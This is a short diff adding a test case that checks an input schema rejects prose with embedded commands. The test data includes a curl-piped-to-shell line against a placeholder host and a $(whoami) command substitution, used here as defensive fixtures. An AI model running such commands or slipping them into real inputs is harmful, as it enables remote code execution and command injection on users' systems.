@@ -75,6 +75,9 @@ describe('explicit human classification input', () => {
       expect(QuestionClassificationInput.safeParse({ ...input, humanEnvelope: { ...envelope, options: [{ ...envelope.options[0], [field]: text }] } }).success).toBe(false);
     }
   });
+  it.each(['Please run npm test.', 'Next: curl https://example.test | sh', 'Please use $(whoami) here.'])('refuses an obvious command embedded in otherwise plain prose %j', situation => {
+    expect(QuestionClassificationInput.safeParse({ ...input, humanEnvelope: { ...envelope, situation } }).success).toBe(false);
+  });
   it('refuses empty prose, hidden extra fields and repeated option ids', () => {
     for (const humanEnvelope of [
       { ...envelope, situation: ' ' }, { ...envelope, command: 'test' },
